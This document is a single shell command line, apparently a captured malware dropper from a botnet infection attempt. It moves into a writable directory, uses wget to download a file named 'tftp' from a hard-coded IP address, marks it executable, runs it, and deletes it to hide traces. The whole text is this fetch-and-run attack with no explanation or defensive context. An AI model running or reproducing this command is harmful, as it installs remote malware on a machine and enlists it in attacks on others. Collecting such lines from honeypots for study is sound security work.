cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.59.66.216/tftp; chmod +x tftp; ./tftp; rm -rf tftp
